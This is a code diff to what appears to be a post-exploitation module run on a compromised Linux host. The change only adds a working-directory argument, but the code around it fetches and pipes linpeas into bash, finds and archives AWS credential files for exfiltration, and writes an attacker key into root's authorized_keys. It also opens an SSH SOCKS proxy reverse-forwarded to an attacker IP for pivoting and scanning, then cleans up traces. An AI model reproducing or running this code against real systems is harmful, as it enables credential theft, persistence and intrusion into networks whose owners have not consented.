@@ -43,7 +43,8 @@ class Module(BaseModule):
                     b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
                 log("payload loaded and ready")
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 log(result)
 
             def exfiltrate():
@@ -69,7 +70,8 @@ aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
 aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 log("creating an instance creds profile...")
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 log(result)
 
                 # remove any pre-existing cred archived
@@ -81,7 +83,8 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
                 log("running credentials find...")
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 log(result)
 
                 # create an archive of all aws creds
@@ -89,7 +92,8 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
                 log("payload loaded and ready")
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 log(result)
 
                 # cleanup any existing local cred archives for this host
@@ -211,7 +215,8 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 payload = base64.b64encode(
                     b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 target_lan = bytes(result.stdout).decode().strip()
                 log(f'Target LAN: {target_lan}')
 
@@ -221,7 +226,8 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     with session.platform.open('/tmp/sockskey', 'wb') as f2:
                         f2.write(f1.read())
                 result = session.platform.run(
-                    f"/bin/bash -c 'chmod 0600 /tmp/sockskey'")
+                    f"/bin/bash -c 'chmod 0600 /tmp/sockskey'",
+                    cwd="/tmp")
                 log("adding public key to authorized on target...")
                 with open(f'/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
                     with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
@@ -232,7 +238,8 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 payload = base64.b64encode(
                     f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 log(f'Result: {result.returncode}')
 
                 # forward local socksproxy to attacker
@@ -240,7 +247,8 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 payload = base64.b64encode(
                     f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
                 result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
+                    cwd="/tmp")
                 log(f'Result: {result.returncode}')
 
                 # run nmap scan via proxychains
@@ -255,14 +263,17 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 # kill ssh socksproxy and portforward
                 log('killing ssh socksproxy and portforward...')
                 result = session.platform.run(
-                    'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
+                    'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)',
+                    cwd="/tmp")
                 log(f'Result: {result.returncode}')
 
                 # remove temporary archive from target
                 if session.platform.Path('/tmp/sockskey').exists():
                     session.platform.unlink('/tmp/sockskey')
             else:
-                result = session.platform.run("${default_payload}")
+                result = session.platform.run(
+                    "${default_payload}",
+                    cwd="/tmp")
                 log(result)
 
             log("Removing sesssion lock...")
